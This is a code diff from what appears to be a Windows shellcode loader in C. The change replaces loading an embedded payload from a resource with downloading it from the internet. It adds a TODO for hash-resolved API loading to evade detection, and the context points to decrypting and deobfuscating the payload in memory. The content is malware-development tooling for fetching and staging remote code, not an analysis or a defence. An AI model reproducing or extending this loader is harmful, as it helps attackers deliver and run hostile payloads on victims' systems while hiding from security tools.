@@ -31,6 +31,7 @@ int main() {
 		return -1;
 	}
 
+	// TODO: Init kernel32 WinAPIs first and then use hashed-resolved version of LoadLibraryA for loading user32.dll
 	// Load user32.dll for use
 	LoadLibraryA("user32.dll");
 
@@ -59,13 +60,21 @@ int main() {
 		}
 	#endif
 
-	// Resource reading
-	if (LoadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
-		PRINTA("[!] Failed To Load Payload From The Resource\n");
+	// Resource reading is only for debugging purposes
+	//if (LoadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
+	//	PRINTA("[!] Failed To Load Payload From The Resource\n");
+	//	return -1;
+	//}
+	//PRINTA("[+] Load Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
+	//PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
+
+	// Internet reading
+	if (LoadPayloadFromInternet(&pPayloadAddress, &sPayloadSize) != TRUE) {
+		PRINTA("[!] Failed To Load Payload From The Internet\n");
 		return -1;
 	}
 	PRINTA("[+] Load Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
-	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
+	PrintHexData("InternetPayload", pPayloadAddress, sPayloadSize);
 
 	// Allocate memory for the payload for the deobfuscation and decryption as the resource section is read-only
 	PVOID pAllocatedAddress = (PVOID)HeapAlloc(
